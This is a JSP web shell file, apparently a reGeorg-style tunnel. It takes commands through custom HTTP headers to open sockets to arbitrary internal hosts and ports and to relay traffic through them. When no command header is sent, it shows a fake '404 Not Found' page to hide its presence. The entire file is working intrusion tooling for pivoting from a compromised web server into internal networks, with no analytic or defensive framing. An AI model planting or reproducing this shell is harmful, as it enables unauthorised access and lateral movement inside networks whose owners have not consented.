<%@page import="java.nio.ByteBuffer, java.net.InetSocketAddress,java.net.UnknownHostException, java.nio.channels.SocketChannel, java.io.IOException" trimDirectiveWhitespaces="true"%><%
    String cmd = request.getHeader("X-CMD");
    String socketID = request.getHeader("socketID");
    if (cmd != null) {
        response.setHeader("X-STATUS", "OK");
        if (cmd.compareTo("CONNECT") == 0) {
            try {
                String target = request.getHeader("X-TARGET");
                int port = Integer.parseInt(request.getHeader("X-PORT"));
                SocketChannel socketChannel = SocketChannel.open();
                socketChannel.connect(new InetSocketAddress(target, port));
                socketChannel.configureBlocking(false);
                if (socketID != null) {
                    session.setAttribute(socketID+"socket", socketChannel);
                } else {
                    session.setAttribute("socket", socketChannel);
                }
                response.setHeader("X-STATUS", "OK");
            } catch (UnknownHostException e) {
                System.out.println(e.getMessage());
                response.setHeader("X-ERROR", e.getMessage());
                response.setHeader("X-STATUS", "FAIL");
            } catch (IOException e) {
                System.out.println(e.getMessage());
                response.setHeader("X-ERROR", e.getMessage());
                response.setHeader("X-STATUS", "FAIL");
                
            }
        } else if (cmd.compareTo("DISCONNECT") == 0) {
            SocketChannel socketChannel;
            if (socketID != null) {
                socketChannel = (SocketChannel)session.getAttribute(socketID+"socket");
            } else {
                socketChannel = (SocketChannel)session.getAttribute("socket");
            }
            try{
                socketChannel.socket().close();
            } catch (Exception ex) {
                System.out.println(ex.getMessage());
            }
            if (socketID != null) {
                session.removeAttribute(socketID+"socket");
            } else {
                session.invalidate();
            }
        } else if (cmd.compareTo("READ") == 0){
            SocketChannel socketChannel;
            if (socketID != null) {
                socketChannel = (SocketChannel)session.getAttribute(socketID+"socket");
            } else {
                socketChannel = (SocketChannel)session.getAttribute("socket");
            }
            try {
                int bufSize = Integer.parseInt(request.getHeader("Bufsize"));
                ByteBuffer buf = ByteBuffer.allocate(bufSize);
                int bytesRead = socketChannel.read(buf);
                int tryTimes = 10;
                while (tryTimes > 0) {
                    if (bytesRead == 0) {
                        Thread.sleep(100);
                        bytesRead = socketChannel.read(buf);
                        if (tryTimes == 1) {
                            System.out.println(tryTimes + " bytesRead: " + bytesRead);
                        }
                        tryTimes--;
                    } else {
                        break;
                    }
                }

                ServletOutputStream so = response.getOutputStream();
                while (bytesRead > 0){
                    so.write(buf.array(),0,bytesRead);
                    so.flush();
                    buf.clear();
                    bytesRead = socketChannel.read(buf);
                }
                response.setHeader("X-STATUS", "OK");
                so.flush();
                so.close();            
                
            } catch (Exception e) {
                System.out.println(e.getMessage());
                response.setHeader("X-ERROR", e.getMessage());
                response.setHeader("X-STATUS", "FAIL");
//                socketChannel.socket().close();
            }
            
        } else if (cmd.compareTo("FORWARD") == 0){
            SocketChannel socketChannel;
            if (socketID != null) {
                socketChannel = (SocketChannel)session.getAttribute(socketID+"socket");
            } else {
                socketChannel = (SocketChannel)session.getAttribute("socket");
            }
            try {
                
                int readlen = request.getContentLength();
                byte[] buff = new byte[readlen];

                request.getInputStream().read(buff, 0, readlen);
                ByteBuffer buf = ByteBuffer.allocate(readlen);
                buf.clear();
                buf.put(buff);
                buf.flip();

                while(buf.hasRemaining()) {
                    socketChannel.write(buf);
                }
                response.setHeader("X-STATUS", "OK");
                //response.getOutputStream().close();
                
            } catch (Exception e) {
                System.out.println(e.getMessage());
                response.setHeader("X-ERROR", e.getMessage());
                response.setHeader("X-STATUS", "FAIL");
                socketChannel.socket().close();
            }
        } 
    } else {
        out.print("<html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>");
    }
%>
